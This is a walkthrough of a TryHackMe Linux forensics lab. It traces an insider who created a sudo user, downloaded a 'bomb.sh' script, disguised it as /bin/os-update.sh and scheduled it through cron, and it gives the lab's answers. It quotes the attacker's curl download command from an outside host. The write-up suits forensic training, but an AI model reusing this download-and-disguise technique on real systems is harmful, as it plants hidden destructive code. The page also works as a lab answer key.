# 🐧 TryHackMe: CyberT Insider Threat – Linux Forensics Investigation

## 🧠 Scenario

An employee from the IT department of one of our clients, **CyberT**, was recently arrested for running a phishing operation. CyberT has asked us to investigate a Linux system the individual accessed to determine whether any malicious activity occurred prior to their arrest.

This investigation required reviewing log files, shell history, and cron jobs to uncover potential insider threats.

---

## 🔍 Questions & Answers

---

### 1) The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

> **Answer:** `/usr/bin/apt install dokuwiki`

**Explanation:**  
To find this, I searched the authentication logs for installation commands using:

```bash
cat /var/log/auth.log | grep "install"
```

The logs revealed a `sudo` command where the user used `/usr/bin/apt` to install `dokuwiki`.

---

### 2) What was the present working directory (PWD) when the previous command was run?

> **Answer:** `/home/cybert`

**Explanation:**  
The same log entry that showed the install command also included a `PWD` field indicating the present working directory at the time of execution.

---

### 3) Which user was created after the package from the previous task was installed?

> **Answer:** `it-admin`

**Explanation:**  
User creation typically uses `adduser`. I searched the logs with:

```bash
cat /var/log/auth.log | grep "adduser"
```

This revealed the addition of a new user named `it-admin`.

---

### 4) A user was then later given sudo privileges. When was the sudoers file updated?  
_Format: Month Day HH:MM:SS_

> **Answer:** `Dec 28 06:27:34`

**Explanation:**  
The `visudo` command is used to safely edit the sudoers file. Searching the logs for `visudo` revealed the timestamp of when the sudo privileges were granted.

---

### 5) A script file was opened using the "vi" text editor. What is the name of this file?

> **Answer:** `bomb.sh`

**Explanation:**  
I searched the logs for the keyword `vi`:

```bash
cat /var/log/auth.log | grep "vi"
```

Only one file was opened with `vi`, and it was named `bomb.sh`.

---

### 6) What is the command used that created the file bomb.sh?

> **Answer:** `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

**Explanation:**  
Looking in the `.bash_history` file of the user `it-admin` revealed the use of a `curl` command to download and save the `bomb.sh` script:

```bash
cat /home/it-admin/.bash_history
```

---

### 7) The file was renamed and moved to a different directory. What is the full path of this file now?

> **Answer:** `/bin/os-update.sh`

**Explanation:**  
I found this by viewing the `.viminfo` file, which stores data about recently opened or saved files in `vi`:

```bash
cat /home/it-admin/.viminfo
```

This showed that `bomb.sh` was saved as `/bin/os-update.sh`.

---

### 8) When was the file from the previous question last modified?  
_Format: Month Day HH:MM_

> **Answer:** `Dec 28 06:29`

**Explanation:**  
Running a detailed listing in `/bin` showed the last modification time of `os-update.sh`:

```bash
ls -al --full-time /bin/os-update.sh
```

---

### 9) What is the name of the file that will get created when the file from the first question executes?

> **Answer:** `goodbye.txt`

**Explanation:**  
Reading the contents of `/bin/os-update.sh` using `cat` showed that it creates a file named `goodbye.txt`.

```bash
cat /bin/os-update.sh
```

---

### 10) At what time will the malicious file trigger?  
_Format: HH:MM AM/PM_

> **Answer:** `08:00 AM`

**Explanation:**  
Inspecting the crontab configuration showed that `os-update.sh` was scheduled to run daily at 08:00 AM:

```bash
crontab -l
```

---


